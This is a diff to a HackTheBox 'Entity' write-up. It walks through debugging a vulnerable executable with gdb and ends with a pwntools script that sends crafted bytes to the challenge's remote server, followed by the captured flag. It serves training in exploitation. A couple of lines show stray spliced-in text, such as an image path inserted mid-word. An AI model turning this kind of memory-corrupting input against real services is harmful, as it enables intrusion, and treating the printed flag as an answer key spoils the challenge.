@@ -5,7 +5,7 @@ source: HackTheBox
 date: 2025-05-07
 read_time: 5 mins?
 ---
-I start by downloading the challenge archive and unzipping the folder to reveal 3 files.
+shI start by downloading the challenge archive and unzipping the folder to reveal 3 files.
 ![](/assets/images/writeups/HackTheBox/Entity/enumeration.png)
 The first is the vulnerable executable, the second is the source code so that disassembly is not a requirement, and the thiassets/images/Writeups/HackTheBox/Entity/enumeration.pngrd is a dummy flag text file to help determine when the challenge has been solved.
 Once I have determined what the challenge provides, I run the executable to see what I can learn from dynamic analysis.
@@ -37,4 +37,46 @@ I locate the assembly code for the set_field function and discover the address t
 This gives me enough new information to formulate a hypothesis and come up with an experiment to test this hypothesis.
 ![](/assets/images/writeups/HackTheBox/Entity/just_A.png)
 My experiment begins with running the code again, entering just a single "A" (as I did in gdb) in order to figure out what the integer representation would be according to the program.
-I know there's no funny business since I didn't find any encoding functions or other cryptographic algorithms that might change the string into non-ASCII, so I consult my favorite format conversion website: [RapidTables](https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=A41). 
+I know there's no funny business since I didn't find any encoding functions or other cryptographic algorithms that might change the string into non-ASCII, so I consult my favorite format conversion website: [RapidTables](https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=A41).
+![](/assets/images/writeups/HackTheBox/Entity/answer.png)
+Instantly I make the discovery that the character I'm entering has a newline character at the end of it and both of those are getting converted to ASCII and printed back out again as decimal.
+I confirm this using gdb:
+![](/assets/images/writeups/HackTheBox/Entity/gdb_answer.png)
+Once I have confirmed my suspicion, I know the answer must be 13371337, so I use RapidTables again to determine my input.
+![](/assets/images/writeups/HackTheBox/Entity/input_for_answer.png)
+My first attempt trying this input is unfruitful due to user error:
+![](/assets/images/writeups/HackTheBox/Entity/gdb_problem.png)
+And then when I try using a script, I get another error:
+![](/assets/images/writeups/HackTheBox/Entity/script_problem.png)
+However, my final script:
+```python
+from pwn import *
+
+#p = process("./entity")
+p = remote("94.237.63.150", 36499)
+
+p.sendline("T")
+p.sendline("S")
+p.sendline(b"\xC9\x07\xCC\x00\x00\x00\x00\x00")
+
+'''
+gdb.attach(p, """
+b *main
+b *get_field+42
+""")
+'''
+
+p.sendline("R")
+p.sendline("L")
+p.sendline("C")
+
+p.interactive()
+```
+proves fruitful:
+![](/assets/images/writeups/HackTheBox/Entity/problem_solution_output.png)
+And thus, the challenge is solved:
+![](/assets/images/writeups/HackTheBox/Entity/final_ans.png)
+# Flag
+```bash
+HTB{th3_3nt1ty_0f_htb00_i5_5t1ll_h3r3}
+```
